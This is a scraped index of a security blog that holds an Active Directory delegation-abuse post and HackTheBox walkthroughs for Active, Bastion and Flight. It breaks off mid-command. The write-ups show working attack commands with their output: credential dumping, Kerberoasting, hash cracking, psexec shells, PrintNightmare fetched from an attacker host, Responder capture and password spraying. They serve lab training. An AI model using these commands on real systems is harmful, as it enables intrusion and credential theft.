</p>"},{"location":"Posts/osint_into_da/#dc01","title":"DC01","text":""},{"location":"Posts/osint_into_da/#abuse-constrained-delegation","title":"Abuse Constrained Delegation","text":"<p>Constrained Delegation</p> <p>Constrained delegation allows an object (user/machine) to autheneticate as any user to specfic services. Means object with constrained delegation privileges can impersonate any domain user (including Domain Admins) to specific service in the target host.</p> <p>Going back into BloodHound, if we enumerate SQLSVC account, we will notice that the service account SQLSVC have constrained  delegation privileges on the host DC01. </p> <p></p> <p>By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the DC01, but first we have to know which service SQLSVC is allowed to delegate. This can be done either from Powerview's <code>Get-NetUser</code> or from BloodHound.  </p> <p></p> <p>So the account SQLSVC are allowed to delegate to the service <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p> <pre><code>proxychains impacket-getST  -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip 10.10.10.12 \nImpacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation\n\n[*] Getting TGT for user\n[*] Impersonating Administrator\n[*]     Requesting S4U2self\n[*]     Requesting S4U2Proxy\n[*] Saving ticket in Administrator.ccache\n</code></pre> <p>Then, we will store the TGT into the variable <code>KRB5CCNAME</code>. </p> <pre><code>export KRB5CCNAME=administrator.ccache\n</code></pre> <p>Finally, let's dump the Domain Admin NTLM hash using <code>Secretdump</code> </p> <pre><code>proxychains -q impacket-secretsdump -k -no-pass dc01.xtech.local  -just-dc-user administrator  \nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nxtech.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373:::\n[*] Cleaning up... </code></pre> <p>The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. </p> <p></p> <p>We can execute commands as Domain Admin.</p> <p></p> <p>Or even login via RDP. </p> <p></p> <p>Now we compromised the Xtech network domain controller and we full access in the infrastructure.  </p>"},{"location":"Posts/osint_into_da/#references","title":"References","text":"<ol> <li>https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained</li> <li>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces</li> <li>https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html</li> <li>https://book.hacktricks.xyz/windows/active-directory-methodology</li> </ol>"},{"location":"Writeups/","title":"Overview","text":"<p> <p></p> <p>Here is collection of my writeups of boxes I have solved in HackTheBox. I'll share only the machines that I wrote a writeup for them all machines that I solved, solved many machines but i did have the time to write the writeup.  </p>"},{"location":"Writeups/#machines","title":"Machines","text":"<ul> <li>Active</li> <li>Bastian</li> <li>Flight</li> <li>Intelligence</li> <li>Knife</li> <li>Love</li> <li>Monitors</li> <li>Scrambled</li> <li>Shoker</li> </ul>"},{"location":"Writeups/machines/active/writeup/","title":"Overview","text":""},{"location":"Writeups/machines/active/writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/active/writeup/#recon","title":"Recon","text":""},{"location":"Writeups/machines/active/writeup/#nmap","title":"nmap","text":"<p><pre><code>PORT      STATE SERVICE       REASON  VERSION\n53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-02 09:48:09Z)\n135/tcp   open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack\n464/tcp   open  kpasswd5?     syn-ack\n593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack\n3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack\n49152/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49153/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49154/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49155/tcp open  msrpc         syn-ack Microsoft Windows RPC\n49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         syn-ack Microsoft Windows RPC\n</code></pre> By looking into <code>nmap</code> results, we can identify that the host is Domain Controller. </p>"},{"location":"Writeups/machines/active/writeup/#enumerating-open-shares","title":"Enumerating Open Shares","text":"<pre><code>\u039e ~/tmp \u2192 smbclient -L \\\\\\\\10.10.10.100 -U '' -N                      Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share Replication     Disk      SYSVOL          Disk      Logon server share Users           Disk      </code></pre> <p>Found open folder <code>Replication</code>, lets dump it is content</p> <pre><code>\u039e Active/dump \u2192 smbclient \\\\\\\\10.10.10.100\\\\Replication -U '' -N \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; recurse on\nsmb: \\&gt; prompt off\nsmb: \\&gt; mget *\n</code></pre>"},{"location":"Writeups/machines/active/writeup/#gpp-stored-credentials","title":"GPP Stored Credentials","text":"<p>The file contain AD Group Policy Preferences (GPP), lets search for any encrypted password. </p> <p>GPP Stored Credentials is old vulnerability which is currently patched, for further reading see the this link: https://adsecurity.org/?p=2288 </p> <p>Usually GPP encrypted passwords is stored in the variable <code>cpassword</code> we can use <code>grep</code> to search for <code>cpassword</code> variable: </p> <pre><code>\u039e Active/dump \u2192 grep -iR \"cpassword\"                                        \nactive.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n</code></pre> <p>Found GPP encypted password for the user <code>svc_tgs</code> which is: <code>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code> </p> <p>Kali linux have built in tool that can decrypt GPP Encrypted password <code>gpp-decrypt</code>: </p> <pre><code>\u039e OldBoxes/shocker \u2192 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n</code></pre> <p><code>svc_tgs</code> user password is <code>GPPstillStandingStrong2k18</code> </p>"},{"location":"Writeups/machines/active/writeup/#request-spn-service-account-tickets","title":"Request SPN Service Account Tickets","text":"<p>After obtain <code>svc_tgs</code> credentials lets use it to request SPN Service accounts tickets: </p> <pre><code>\u039e Active/dump \u2192 GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/svc_tgs -request \nImpacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation\n\nPassword:\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-21 11:07:03.723783             $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$b43bf8023365ea1108b5424b53c2a450$146e01d19a37eca33003ca119ded7a074639abadba134eeed77439ba7679c5dda70afc803385e024a64b2fac83e29d1d75d81f0573aa0cce61870aee4eab395ca3b48146e75ade21025ef408446ad90763ef6e17cea403f82eacf20178fc78a3b6cc8694136a816c8aeac46fd23cf95729a287ea6c8232c554a7ce1f2244df1df6c8a34fcfac5199147f26249343a1f34f224716098568e7eb7c490760f1bc90100536274d89bba11e134c6df6b8d625d3805f9a60dfc1e47b15b038ba8c43fbf4d27249f92ac80fc8828d1a29b601c4d9271774239400b95c7fd530991ff5b37b5c26b192b0cfbea2af928adf902ea373ac9997e6f3379345c5f324fd4e8ab76c1dc98c71cc2e78d2e360dfa1196d7319f5ed40d3011372c91a6f0411dd56af96bc4b3af8bb29c68462313b56d2b86aa0b60448ad8b2a7f878c74621388ea0dcb7a0fe165eca97dbd549e2b2e34654cca5d6ce1d6d2c697ae41bd24d599d0f6ad74fd1f063c66ec6a87029baa4731d0be51f63a54d7bcdc7ba13f2e834c381fb1d46e7c6df8675dc85b6ccb328494635a2c2ee48cbc9d2c8514b8884d945f796cb4c468fa631c2e33253da49cd16cd46fc170e66435d5395080af0ebffb39e6d514524258accb383e7d5f65d4536255ee19d381ee1fea36e746eea0333f8126c4b22c9ff9d79c77d03abff93318e9277f75d81fcd93ea1c039706f41585d2383e0af51b3f990cc2a32608a482d564455c405324e9b2f678300ff1056cfecd5d242bc39451f885f1441a4a80334ce19104accd3bed6476ea454d053c2d386078960a66df55c4706b945612fa712c4d4a70cb07c2f3d5a648e9620be5fb049e73bbe30bfeecf48f1f483bb5bed90337f4e56d033a1a3fce605d05043f1d24c1f73213a2591fa538f9215dee625df91a9157f09a074259b96a1993d045a59ae97103f8f2395866f3829fde0a7eb6ea3708982770649321534fd29ebbb8072e8a1ed7494e5967aa2526e572746c02e9ccb61d1738923c00fe9ab846c47712d8d5b0c9e8a0298c96321a0b5fd2f9ef31433043f8d219f80cffb98e86ce024a4e7ad3e61632a081a86d93b0554ec4d69d776ca9f8f8386d13c23a0a35138e998ce6029ae963b9964b14289de3e554e96be23b6ceb3469d8ef76e0d98a9faf7b32a4a0387aee9c48072245d926db2641379f7a79f26440465fff1340a5e4f5cec32166e780cb452e2e53e4975b5aac913e93175aa7c7a3b53477339d7c\n</code></pre> <p>We found Administrator ticket! </p> <p>Let's crack it using hashcat</p> <pre><code>Active/dump \u2192 hashcat -a 0 -m 13100 admin-krb.txt /usr/share/wordlists/rockyou.txt --force\nhashcat (v6.1.1) starting...\n\n...\n\n$krb5tgs$23$*Administrator$...\n....9d7c:Ticketmaster1968\n\nSession..........: hashcat\nStatus...........: Cracked\n....\n</code></pre> <p>Now obtained Administrator password! Which is <code>Ticketmaster1968</code> we can now login into the target machine with full privileges. </p> <pre><code>HTB/Boxes \u2192 psexec.py administrator:'Ticketmaster1968'@10.10.10.100          \nImpacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation\n\n[*] Requesting shares on 10.10.10.100.....\n[*] Found writable share ADMIN$\n[*] Uploading file eWhpxQSR.exe\n[*] Opening SVCManager on 10.10.10.100.....\n[*] Creating service RfrB on 10.10.10.100.....\n[*] Starting service RfrB.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>Now we can grap <code>user.txt</code> and <code>root.txt</code> flags</p> <pre><code>c:\\Users&gt;more svc_tgs\\desktop\\user.txt\n86d67d8ba232bb6a254aa4d10159e983\n\nc:\\Users&gt;more administrator\\desktop\\root.txt\nb5fc76d1d6b91d77b2fbf2d54d0f708b\n</code></pre>"},{"location":"Writeups/machines/bastian/writeup/","title":"Overview","text":""},{"location":"Writeups/machines/bastian/writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/bastian/writeup/#recon","title":"Recon","text":""},{"location":"Writeups/machines/bastian/writeup/#nmap","title":"nmap","text":"<pre><code>PORT    STATE SERVICE      REASON  VERSION\n22/tcp  open  ssh          syn-ack OpenSSH for_Windows_7.9 (protocol 2.0)\n| ssh-hostkey: |   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3\n|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=\n|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN\n135/tcp open  msrpc        syn-ack Microsoft Windows RPC\n139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n</code></pre>"},{"location":"Writeups/machines/bastian/writeup/#enumerating-smb-shares","title":"Enumerating SMB Shares","text":"<pre><code>OldBoxes/bastian \u2192 smbclient -L \\\\\\\\10.10.10.134 -U 'anonymouse' -N Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    Backups         Disk      C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n</code></pre> <pre><code>bastian/dump \u2192 smbclient \\\\\\\\10.10.10.134\\\\backups -U 'anonymouse' -N \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; recurse on\nsmb: \\&gt; prompt off\nsmb: \\&gt; timeout 1000000\nio_timeout per operation is now 1000000\nsmb: \\&gt; mget * </code></pre>"},{"location":"Writeups/machines/bastian/writeup/#enumerating-win-hard-disk","title":"Enumerating Win Hard Disk","text":"<p>Run Mimikatz inside VHD to found the user <code>L4mpje</code> NTLM hash: <code>26112010952d963c8dc4217daec986d9</code></p> <pre><code>mimikatz # lsadump::sam /system:SYSTEM /sam:SAM\nDomain : L4MPJE-PC\nSysKey : 8b56b2cb5033d8e2e289c26f8939a25f\nLocal SID : S-1-5-21-18827714-3633218324-154007371\nSAMKey : 335e6c10b1dce6433e9ef82d30f49d3a\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\nRID  : 000001f5 (501)\nUser : Guest\nRID  : 000003e8 (1000)\nUser : L4mpje\n  Hash NTLM: 26112010952d963c8dc4217daec986d9\n</code></pre> <p>Then crack it using hashcat </p> <pre><code>\u039e bastian/dump \u2192 hashcat -a 0 -m 1000 l4mpje-ntlm /usr/share/wordlists/rockyou.txt  \nhashcat (v6.1.1) starting...\n\n....\n\n26112010952d963c8dc4217daec986d9:bureaulampje    \n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: NTLM\nHash.Target......: 26112010952d963c8dc4217daec986d9\n</code></pre> <p>Then login into SSH </p> <pre><code>bastian/dump \u2192 ssh L4mpje@10.10.10.134 \nThe authenticity of host '10.10.10.134 (10.10.10.134)' can't be established.\nECDSA key fingerprint is SHA256:ILc1g9UC/7j/5b+vXeQ7TIaXLFddAbttU86ZeiM/bNY.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.134' (ECDSA) to the list of known hosts.\nL4mpje@10.10.10.134's password: \n\nMicrosoft Windows [Version 10.0.14393]                                                                                          (c) 2016 Microsoft Corporation. All rights reserved.                                                                            \n\nl4mpje@BASTION C:\\Users\\L4mpje&gt;\n</code></pre> <pre><code>l4mpje@BASTION C:\\Users\\L4mpje\\Desktop&gt;more user.txt                                                                            \n9bfe57d5c3309db3a151772f9d86c6cd      </code></pre>"},{"location":"Writeups/machines/bastian/writeup/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/bastian/writeup/#printnightmare-cve-2021-1675","title":"PrintNightmare (CVE 2021-1675)","text":"<pre><code>PS C:\\Users\\L4mpje\\Videos&gt; Invoke-WebRequest \"http://10.10.14.27:9001/CVE-2021-1675.ps1\"\n\nPS C:\\Users\\L4mpje\\Videos&gt; . .\\CVE-2021-1675.ps1  \n</code></pre> <pre><code>PS C:\\Users\\L4mpje\\Videos&gt; Invoke-Nightmare                                                                                     [+] using default new user: adm1n                                                                                               [+] using default new password: P@ssw0rd                                                                                        [+] created payload at C:\\Users\\L4mpje\\AppData\\Local\\Temp\\nightmare.dll                                                         [+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_1734185bdb8f8610\\Amd64\\mxdwdrv.dll\"   [+] added user  as local administrator                                                                                          [+] deleting payload from C:\\Users\\L4mpje\\AppData\\Local\\Temp\\nightmare.dll                                                      \nPS C:\\Users\\L4mpje\\Videos&gt; net users                                                                                            \n\nUser accounts for \\\\BASTION                                                                                                     \n\n-------------------------------------------------------------------------------                                                 \nadm1n                    Administrator            DefaultAccount                                                                \nGuest                    L4mpje                                                                                                 \nThe command completed successfully. </code></pre> <pre><code>bastian/dump \u2192 ssh adm1n@10.10.10.134 \nadm1n@10.10.10.134's password: \ndPermission denied, please try again.\nadm1n@10.10.10.134's password: \n\nMicrosoft Windows [Version 10.0.14393]                                                                 (c) 2016 Microsoft Corporation. All rights reserved.                                                   \n\nadm1n@BASTION C:\\Users\\Administrator\\Desktop&gt;more root.txt                                             \n958850b91811676ed6620a9c430e65c8\n</code></pre>"},{"location":"Writeups/machines/flight/writeup/","title":"Writeup","text":""},{"location":"Writeups/machines/flight/writeup/#overview","title":"Overview","text":"<p>Flight was Domain Controller which have multiple pivoting points between Domain Users/services. The box have interesting and different techniques for exploiting and pivoting between Domain Users/services. Including: Local File Include, using Responder to capture hashes, password spray, enumerating shares, uploading PHP and ASPX web shells, abusing seImpersonate for privileges escalation. </p>"},{"location":"Writeups/machines/flight/writeup/#machine-info","title":"Machine Info","text":"Operating System Difficulty IP Windows Hard 10.10.11.187"},{"location":"Writeups/machines/flight/writeup/#attack-scenario-road-map","title":"Attack Scenario Road Map","text":""},{"location":"Writeups/machines/flight/writeup/#walkthrough","title":"Walkthrough","text":""},{"location":"Writeups/machines/flight/writeup/#recon","title":"Recon","text":"nmap <pre><code>nmap 10.10.11.187 -sCV \nPORT     STATE SERVICE       REASON  VERSION\n53/tcp   open  domain        syn-ack Simple DNS Plus\n80/tcp   open  http          syn-ack Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)\n|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1\n| http-methods: |   Supported Methods: GET POST OPTIONS HEAD TRACE\n|_  Potentially risky methods: TRACE\n|_http-title: g0 Aviation\n88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-02-02 10:54:03Z)\n135/tcp  open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds? syn-ack\n464/tcp  open  kpasswd5?     syn-ack\n593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped    syn-ack\n3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped    syn-ack\nService Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: |   3.1.1: |_    Message signing enabled and required\n| smb2-time: |   date: 2023-02-02T10:54:28\n|_  start_date: N/A\n|_clock-skew: 6h59m57s\n| p2p-conficker: |   Checking for Conficker.C or higher...\n|   Check 1 (port 32072/tcp): CLEAN (Timeout)\n|   Check 2 (port 50018/tcp): CLEAN (Timeout)\n|   Check 3 (port 20979/udp): CLEAN (Timeout)\n|   Check 4 (port 44855/udp): CLEAN (Timeout)\n|_  0/4 checks are positive: Host is CLEAN or ports are blocked\n</code></pre> <p>By looking into <code>nmap</code> scan results, the ports 53, 389, and 636 are open which mean the server is Domain Controller. Furthermore, the main domain is flight.htb and the hostname is g0</p>"},{"location":"Writeups/machines/flight/writeup/#web-enumeration","title":"Web Enumeration","text":"<p>The main website is statice website and does not have any functions to play with. </p>"},{"location":"Writeups/machines/flight/writeup/#subdomain-enumeration","title":"Subdomain Enumeration","text":"<pre><code>gobuster dns -d flight.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt\nFound: school.flight.htb\n</code></pre> <p>Enumerating the subdomains reveal for us a new subdomain: <code>school.flight.htb</code></p>"},{"location":"Writeups/machines/flight/writeup/#web-enumeration-schoolflighthtb","title":"Web Enumeration - school.flight.htb","text":"<p>Going through the website we will identify a Local File Inclusion vulnerability in the path: <code>http://school.flight.htb/index.php?view=&lt;&gt;</code> however, the website blocks any requests that contains LFI payloads. </p> <p></p>"},{"location":"Writeups/machines/flight/writeup/#capturing-ntlm-hash-apache_svc","title":"Capturing NTLM Hash - apache_svc","text":"<p>Rather than trying to read local files, let\u2019s try to put our own network address path and running <code>Responder</code> in the background. </p> <pre><code>http://school.flight.htb/index.php?view=//10.10.14.45/abc\n</code></pre> <p>By entering our own network address path we will capture the running web service account NTLM hash:</p> <pre><code>Responder -I tun0 [SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.187\n[SMB] NTLMv2-SSP Username : flight\\svc_apache\n[SMB] NTLMv2-SSP Hash     : svc_apache::flight:fde05e6599f40c3fn</code></pre>"},{"location":"Writeups/machines/flight/writeup/#cracking-ntlm-hash","title":"Cracking NTLM Hash","text":"<p>Here we can use <code>Hashcat</code> to attempt to crack the obtained NTLM hash. </p> <pre><code>hashcat -m 5600 svc_apache rockyou.txt\n...\nSVC_APACHE::flight:fde05e6\n...\n...\n00000:S@Ss!K@*t13\n</code></pre> <p>We cracked <code>svc_apache</code> hash which is: <code>S@Ss!K@*t13</code> to validate it we can use crackmapexec: </p> <pre><code>crackmapexec smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'                            \nSMB         school.flight.htb 445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         school.flight.htb 445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13\n</code></pre>"},{"location":"Writeups/machines/flight/writeup/#password-spray","title":"Password Spray","text":"<p>While having <code>svc_apache</code> service account password, we can perform password spray against the Domain Users. To collect all Domain Users we can <code>CrackMapExec</code> with the flag <code>--users</code> </p> <pre><code>crackmapexec smb flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' --users \nSMB         school.flight.htb 445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         school.flight.htb 445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \nSMB         school.flight.htb 445    G0               [+] Enumerated domain user(s)\nSMB         school.flight.htb 445    G0               flight.htb\\O.Possum                       badpwdcount: 0 desc: H\nSMB         school.flight.htb 445    G0               flight.htb\\svc_apache                     badpwdcount: 0 desc: S\nSMB         school.flight.htb 445    G0               flight.htb\\V.Stevens                      badpwdcount: 0 desc: S\nSMB         school.flight.htb 445    G0               flight.htb\\D.Truff                        badpwdcount: 0 desc: P\nSMB         school.flight.htb 445    G0               flight.htb\\I.Francis                      badpwdcount: 0 desc: N\nSMB         school.flight.htb 445    G0               flight.htb\\W.Walker                       badpwdcount: 0 desc: P\nSMB         school.flight.htb 445    G0               flight.htb\\C.Bum                          badpwdcount: 0 desc: S\nSMB         school.flight.htb 445    G0               flight.htb\\M.Gold                         badpwdcount: 0 desc: S\nSMB         school.flight.htb 445    G0               flight.htb\\L.Kein                         badpwdcount: 0 desc: P\nSMB         school.flight.htb 445    G0               flight.htb\\G.Lors                         badpwdcount: 0 desc: S\nSMB         school.flight.htb 445    G0               flight.htb\\R.Cold                         badpwdcount: 0 desc: H\nSMB         school.flight.htb 445    G0               flight.htb\\S.Moon                         badpwdcount: 1 desc: J\nSMB         school.flight.htb 445    G0               flight.htb\\krbtgt                         badpwdcount: 0 desc: K\nSMB         school.flight.htb 445    G0               flight.htb\\Guest                          badpwdcount: 0 desc: B\nSMB         school.flight.htb 445    G0               flight.htb\\Administrator                  badpwdcount: 1 desc: B\n</code></pre> <p>Then, we can perform password spray:</p> <pre><code>crackmapexec smb flight.htb -u /tmp/users -p 'S@Ss!K@*t13' --continue-on-success\nSMB         school.flight.htb 445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         school.flight.htb 445    G0               [-] flight.htb\\D.TRUFF:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\I.FRANCIS:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\O.POSSUM:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\V.STEVENS:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [+] flight.htb\\SVC_APACHE:S@Ss!K@*t13 \nSMB         school.flight.htb 445    G0               [-] flight.htb\\G.LORS:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\ADMINISTRATOR:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\W.WALKER:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\R.COLD:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\KRBTGT:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\C.BUM:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\M.GOLD:S@Ss!K@*t13 STATUS_LOGON_FAILURE \nSMB         school.flight.htb 445    G0               [-] flight.htb\\L.KEIN:S@Ss!K@*t13 STATUS_LOGON_FAILURE SMB         school.flight.htb 445    G0               [+] flight.htb\\S.MOON:S@Ss!K@*t13\n</code></pre> <p>We found that <code>s.moon</code> is using the same password of <code>svc_apache</code> </p>"},{"location":"Writeups/machines/flight/writeup/#enumerating-shared-folders","title":"Enumerating Shared Folders","text":"<p>The Domain User <code>s.moon</code> have read and write privileges in the folder <code>shared</code></p> <pre><code>crackmapexec smb flight.htb -u s.moon -p 'S@Ss!K@*t13' --shares             \nSMB         school.flight.htb 445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         school.flight.htb 445    G0               [+] flight.htb\\s.moon:S@Ss!K@*t13 \nSMB         school.flight.htb 445    G0               [+] Enumerated shares\nSMB         school.flight.htb 445    G0               Share           Permissions     Remark\nSMB         school.flight.htb 445    G0               -----           -----------     ------\nSMB         school.flight.htb 445    G0               ADMIN$                          Remote Admin\nSMB         school.flight.htb 445    G0               C$                              Default share\nSMB         school.flight.htb 445    G0               IPC$            READ            Remote IPC\nSMB         school.flight.htb 445    G0               NETLOGON        READ            Logon server share SMB         school.flight.htb 445    G0               Shared          READ,WRITE      SMB         school.flight.htb 445    G0               SYSVOL          READ            Logon server share \nSMB         school.flight.htb 445    G0               Users           READ            \nSMB         school.flight.htb 445    G0               Web             READ\n</code></pre>"},{"location":"Writeups/machines/flight/writeup/#capturing-ntlm-hash-cbum","title":"Capturing NTLM Hash - c.bum","text":"<p>While we have write privileges, we can attempt to upload shortcut file or <code>.ini</code> file. First create the file:</p> <pre><code>echo 'IconFile=\\\\10.10.14.45\\abc' &gt; abc.ini\n</code></pre> <p>Then, upload it to <code>Shared</code> folder: </p> <pre><code>smbclient \\\\\\\\10.10.11.187\\\\shared -U 'flight\\s.moon' --password 'S@Ss!K@*t13'\nsmb: \\&gt; put 